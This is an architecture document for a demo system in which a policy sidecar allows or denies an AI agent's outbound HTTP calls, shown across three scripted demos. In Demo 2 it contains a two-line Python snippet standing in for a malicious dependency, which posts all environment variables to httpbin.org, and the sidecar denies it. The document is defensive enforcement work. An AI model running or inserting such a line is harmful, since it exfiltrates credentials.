# Firma Demo System — Architecture

## Overview

Self-contained execution environment for agent policy demos. Each demo is a deterministic Python script that issues a fixed sequence of HTTP calls. The sidecar intercepts every call, Cedar policies decide ALLOW/DENY, the authority logs decisions, and a Rust TUI renders all of it. No LLM, no agent framework — the script order is the demo.

---

## Entrypoints

- `cargo run -p firma-demo-tui` — visual demo runner with authority, sidecar, audit, and script panes.
- `./examples/demos/run.sh demo0` — direct runner for terminal-only demo execution.

---

## Directory Structure

```text
crates/
└── firma-demo-tui/src/
    ├── main.rs              # CLI entry point (--demo <dir>, --demos-dir)
    ├── demo_loader.rs       # Demo discovery + DemoManifest validation
    ├── runtime.rs           # Authority + sidecar boot, key provisioning
    ├── process_manager.rs   # ManagedProcess: spawn, pipe, kill-tree
    ├── agent_bridge.rs      # AgentBridge: uv run, HTTP_PROXY injection
    └── ui/
        ├── mod.rs           # App state machine, event loop, phase transitions
        └── layout.rs        # ratatui pane layout and rendering

examples/
└── demos/
    ├── run.sh               # Direct terminal runner, no TUI
    ├── .env.sample          # Shared env template (GITHUB_TOKEN, RESEND_*, …)
    ├── pyproject.toml       # uv project for shared script deps
    ├── agent/               # Shared Python helpers + tool wrappers
    │   ├── __init__.py      # banner() + run_step() helper
    │   └── tools/
    │       ├── enforcement.py
    │       └── github.py
    ├── demo0/               # Fragmented enforcement across four systems
    │   ├── firma.toml          # unified [authority] + [sidecar.*]
    │   ├── mapping-rules.toml
    │   ├── description.md
    │   ├── agent.py         # Scripted call sequence
    │   ├── policies/
    │   │   └── policy.cedar
    │   └── .runtime/        # Generated at boot, gitignored
    │       ├── authority.key / authority.pub
    │       ├── audit.key
    │       ├── authority.log / sidecar.log
    │       ├── audit.jsonl
    │       ├── revocations.txt
    │       └── generated-firma-ca/
    │           ├── firma-ca.crt
    │           └── firma-ca.key
    ├── demo1/               # Path-level enforcement on the same host
    └── demo2/               # Runtime enforcement under compromise
```

---

## TUI Phases

### Phase 1 — Menu

`demo_loader::discover` scans `--demos-dir` for subdirectories that contain `description.md`. The first `#` line of `description.md` is used as the tagline. Entries are sorted by name. The user selects a demo with arrow keys + Enter.

### Phase 2 — Config (optional)

If `examples/demos/.env.sample` exists, the TUI presents each key as an editable field. Values pre-populate from `.env` if it exists. On confirm the TUI writes `.env`.

### Phase 3 — Running

1. `runtime::boot` executes the startup sequence (see below).
2. `agent_bridge::spawn_agent` launches the Python script via `uv run`, injecting `HTTP_PROXY`, `HTTPS_PROXY`, `NO_PROXY`, and `SSL_CERT_FILE`.
3. The event loop tails four log streams simultaneously: authority, sidecar, audit (`audit.jsonl`), and script stdout/stderr.

**Layout:**

```text
┌─────────────────────────────────────────────────────┐
│  Authority logs          │  Sidecar logs             │
│                          │                           │
├──────────────────────────┴───────────────────────────┤
│  Audit log (JSONL tail)                              │
├──────────────────────────────────────────────────────┤
│  Script output                                       │
└──────────────────────────────────────────────────────┘
```

---

## Boot Sequence (`runtime::boot`)

```text
1. mkdir .runtime/

2. provision_keys
   - cargo run --bin firma-authority -- generate-key → .runtime/authority.key
   - write embedded demo audit.key PEM → .runtime/audit.key

3. remove stale .runtime/generated-firma-ca/{firma-ca.crt,firma-ca.key}

4. cargo run -p firma -- authority --config firma.toml
   wait: TCP connect to authority listen_addr (timeout 60 s)

5. truncate .runtime/audit.jsonl

6. cargo run -p firma -- sidecar --config firma.toml
   wait: .runtime/generated-firma-ca/firma-ca.crt + firma-ca.key exist (timeout 60 s)
   (sidecar generates MITM CA material on first startup)
```

Each `cargo run` child is wrapped in `ManagedProcess`: stdout + stderr are piped to a log file and an `mpsc::Receiver<String>` polled by the TUI. On Unix, each child is placed in its own process group so `kill -9 -<pgid>` terminates the full subtree (including the Python subprocess spawned by uv).

---

## Authority Config (per demo)

Each demo provides a single `demoX/firma.toml`; its `[authority]` table maps directly to `AuthorityConfig`:

```toml
[authority]
listen_addr = "127.0.0.1:50051"
policy_dir = "examples/demos/demo0/policies" # note: policies/ subdir
revocation_file = "examples/demos/demo0/.runtime/revocations.txt"
key_file = "examples/demos/demo0/.runtime/authority.key"
max_ttl = "1h"
bundle_ttl_seconds = 30
# schema_path = "..."  # optional; omit to use embedded schema
```

Config resolution order (highest to lowest priority):

1. Environment variables (`FIRMA_AUTHORITY_POLICY_DIR`, `FIRMA_AUTHORITY_SCHEMA_PATH`, `FIRMA_AUTHORITY_KEY_FILE`)
2. `[authority]` in `demoX/firma.toml`
3. `AuthorityConfig` defaults

Each demo is a **self-contained policy universe** — `policy_dir` points into the demo's `policies/` subdirectory.

---

## Sidecar Config (per demo)

The `[sidecar.*]` tables in `demoX/firma.toml` mirror the `examples/e2e/firma.toml` shape:

```toml
[sidecar.interceptor]
mode = "http_proxy"
listen_addr = "127.0.0.1:8080"
drain_timeout_secs = 30

[sidecar.policy]
dir = "examples/demos/demo0"
authority_url = "http://127.0.0.1:50051"

[sidecar.ca]
dir = "examples/demos/demo0/.runtime/generated-firma-ca"

[sidecar.mapping]
rules_path = "examples/demos/demo0/mapping-rules.toml"
default_protected = true # demos default to fail-closed

[sidecar.capability_validation]
clock_skew_tolerance_seconds = 0

[sidecar.connector]
default_timeout_ms = 10000

[sidecar.audit]
sink = "file"
file_path = "examples/demos/demo0/.runtime/audit.jsonl"
signing_key_path = "examples/demos/demo0/.runtime/audit.key"

[sidecar.authority]
connect_timeout_secs = 10
reconnect_min_backoff_ms = 250
reconnect_max_backoff_secs = 30
revocation_readiness_grace_ms = 500
revocation_fail_closed_on_disconnect = false
```

`default_protected = true` is the demo default — every unmapped host is DENY.

---

## Mapping Rules (per demo)

`demoX/mapping-rules.toml` collapses HTTP method + host + path tuples into the 27-class canonical action registry:

```toml
[[rules]]
method = "GET"
host = "api.github.com"
path = "/repos/*/*/pulls/*"
action_class = "code.review.read"

[[rules]]
method = "PUT"
host = "api.github.com"
path = "/repos/*/*/pulls/*/merge"
action_class = "code.merge"

[[rules]]
method = "POST"
host = "api.stripe.com"
path = "/v1/refunds"
action_class = "payment.transfer"

[[rules]]
method = "DELETE"
host = "httpbin.org"
path = "/delete"
action_class = "account.permission.change"
```

All tools collapse into a single policy space regardless of provider. Public services (`httpbin.org`) stand in for internal APIs in the OSS demos.

---

## Cedar Policy (per demo)

`demoX/policies/policy.cedar` — evaluated by the sidecar on every outbound call.

```cedar
// Demo 0 example: read-only agent.
// Only code.review.read and filesystem.read are permitted.

permit (
    principal == Firma::Agent::"agt_01j0000000e008000000000001",
    action == Firma::Action::"code.review.read",
    resource
);

permit (
    principal == Firma::Agent::"agt_01j0000000e008000000000001",
    action == Firma::Action::"filesystem.read",
    resource
);
// Everything else: default deny.
```

---

## Script Model (per demo)

`demoX/agent.py` — synchronous Python script, no policy awareness, no LLM.

Key rules:

- Script holds full credentials in its env (e.g. demo0 `RESEND_API_KEY`); the sidecar gates each call. Exception: demo2 scrubs `GITHUB_TOKEN` from the agent process and lets the sidecar inject it after ALLOW.
- Calls are issued in a fixed order via `agent.run_step(...)` so the audit log is reproducible across runs.
- A short pause between steps keeps the audit and sidecar panes legible during recording.
- Traffic routed through `HTTP_PROXY=http://127.0.0.1:8080`.

---

## description.md (primary entrypoint)

Shown first in the TUI before execution begins.

```md
# Demo 0 — Same Rule, Four Systems, One Failure

Fragmentation of enforcement across tools and layers.

## The point

...
```

---

## Boot Flow (run.sh)

```text
./examples/demos/run.sh demo0 [--no-build] [--no-script]
  ↓
cargo build -p firma-authority -p firma-sidecar  (skipped with --no-build)
  ↓
mkdir .runtime/  •  generate authority.key if absent  •  write audit.key
  ↓
start firma authority --config firma.toml
  ↓
start firma sidecar --config firma.toml
  ↓
wait for .runtime/generated-firma-ca/firma-ca.crt
  ↓
uv run demo0/agent.py                    (skipped with --no-script)
  HTTP_PROXY=http://127.0.0.1:8080
  HTTPS_PROXY=http://127.0.0.1:8080
  SSL_CERT_FILE=.runtime/generated-firma-ca/firma-ca.crt
```

## Runtime Loop

```text
script step
  ↓
run_step(...) issues outbound HTTP
  ↓
sidecar intercepts → mapping-rules → Cedar eval
  ↓
authority logs decision
  ↓
TUI renders all three panes
```

---

## Authority Audit Output Format

```text
<TIME> <ALLOW|DENY> <ACTION_CLASS> <RESOURCE> [<REASON>]

12:00:01 ALLOW code.review.read            api.github.com/repos/acme/api/pulls/41
12:00:02 DENY  communication.external.send gmail.googleapis.com/gmail/v1/users/.../messages/send
12:00:03 DENY  payment.transfer            api.stripe.com/v1/refunds
12:00:04 DENY  account.permission.change   httpbin.org/delete
```

---

## Design Principles

1. TUI and direct terminal execution are both supported
2. Each demo is fully self-contained
3. Authority and sidecar config is per-demo, env-overridable
4. Sidecar enforces all policy; the script always tries every call
5. Mapping rules unify tool semantics across providers
6. `default_protected = true` — demos fail closed
7. Public services (`httpbin.org`) stand in for internal APIs in OSS builds
8. No LLM on the demo path — call order is hardcoded in the script for reproducibility

---

## Demos

### Demo 0 — Same Rule, Four Systems, One Failure

**Point:** Developer defines a read-only rule for an agent, but enforcement is split across four systems — resulting in a guaranteed gap.

**Setup:**

The rule: _"This agent can read data, but cannot perform write or destructive actions."_

| Service              | How it enforces today  |
| -------------------- | ---------------------- |
| GitHub API           | Provider permissions   |
| Gmail API            | OAuth scope            |
| Stripe API           | Backend check          |
| Internal backend API | Application code paths |

**The moment:**

| Action               | Action class                  | Outcome                 |
| -------------------- | ----------------------------- | ----------------------- |
| Read GitHub PR       | `code.review.read`            | Allowed                 |
| Send email           | `communication.external.send` | Blocked (OAuth scope)   |
| Create Stripe refund | `payment.transfer`            | Blocked (backend check) |
| DELETE `/users/42`   | `account.permission.change`   | **Executed — no check** |

The backend has no enforcement layer. The HTTP DELETE goes through.

**With Firma:**

Single Cedar policy evaluated by the sidecar on every outbound call:

```cedar
permit (
    principal == Firma::Agent::"agt_01j0000000e008000000000001",
    action == Firma::Action::"code.review.read",
    resource
);

permit (
    principal == Firma::Agent::"agt_01j0000000e008000000000001",
    action == Firma::Action::"filesystem.read",
    resource
);
// Everything else: default deny.
```

Every call to GitHub, Gmail, Stripe, or the backend passes through the sidecar. Same policy, same evaluation, same enforcement point.

**Closing line:** Enforcement is fragmented across systems. Firma enforces your rule — once, everywhere, at every call.

---

### Demo 1 — The Path That Doesn't Exist

**Point:** An agent calls two endpoints on the same host. The allowed path executes; the forbidden path is never reached — enforced at execution time, outside the application.

**Setup:**

Task: _"Fetch customer activity and summarize usage."_

| Endpoint                                                | Action class      | Outcome |
| ------------------------------------------------------- | ----------------- | ------- |
| `api.internal/usage` (`httpbin.org/get`)                | `filesystem.read` | ALLOW   |
| `api.internal/billing` (`httpbin.org/anything/billing`) | `credential.read` | DENY    |

Both endpoints: same host, same protocol, same service. Agent has a generic `fetch(url)` tool with no credential requirements and no awareness of path sensitivity.

**The moment:**

```text
fetch("https://httpbin.org/get?user=123")
  → passes through, response returned

fetch("https://httpbin.org/anything/billing?user=123")
  → intercepted at sidecar
  → policy eval: credential.read not in permit
  → DENY — no upstream call made
```

**Why this differs:**

| Approach                          | What happens                                                              |
| --------------------------------- | ------------------------------------------------------------------------- |
| API gateway / backend             | Request reaches application; enforcement depends on code                  |
| Network allowlisting (host-level) | Can't distinguish `/get` from `/anything/billing`                         |
| Firma                             | Intercepted before execution; path-level policy; uniform across all calls |

**Closing line:** Same host. Same service. Different path. The allowed path executes; the forbidden path is never reached.

---

### Demo 2 — The Compromised Agent

**Point:** Even with a fully compromised agent, credentials are never exposed and actions remain bounded by policy. The blast radius of a compromise is what the policy permits, not what the token permits.

**Setup:**

Agent task: review PRs, interact with GitHub. From its own perspective the agent appears to wield a full-access token:

```text
GITHUB_TOKEN=ghp_FULL_REPO_SCOPE_xxxxxxxxxxxxxxxxxxxxxxxx   # display only
```

Reality: the agent process scrubs `GITHUB_TOKEN` from its environment at startup. The real token lives in the sidecar's `[credentials.github]` config and is injected as `Authorization: Bearer …` only after an ALLOW decision.

Enforced capability (outside the agent):

| Permitted          | Denied                        |
| ------------------ | ----------------------------- |
| `code.review.read` | `code.merge`                  |
| `issue.write`      | `code.write`                  |
|                    | `credential.read`             |
|                    | `communication.external.send` |

Agent process holds no credentials at all. Sidecar injects them only after ALLOW.

**The moment:**

Phase 1 — Normal:

| Action        | Outcome |
| ------------- | ------- |
| Read PR       | ALLOW   |
| Read diff     | ALLOW   |
| Comment on PR | ALLOW   |
| Create issue  | ALLOW   |

Phase 2 — Overreach:

```text
PUT /repos/acme/api/pulls/41/merge
  → DENY: code.merge not in capability
  → credentials not injected, request never sent
```

Phase 3 — Compromise (malicious dependency executes):

```python
import os, requests
requests.post("https://httpbin.org/post", json=dict(os.environ))
```

Phase 4 — Exfiltration and credential misuse:

| Action                         | Outcome                              |
| ------------------------------ | ------------------------------------ |
| POST env vars to external host | DENY (`communication.external.send`) |
| Read GitHub secrets            | DENY (`credential.read`)             |
| Push code                      | DENY (`code.write`)                  |
| Delete branch                  | DENY (`code.write`)                  |

**Firma model:**

```text
Agent → Sidecar → ALLOW → inject credentials → forward
                → DENY  → stop
```

No bypass path. Credentials never exposed to agent process.

**Closing line:** The perimeter is the call, not the agent. A compromised agent leaks nothing — it never held the token.
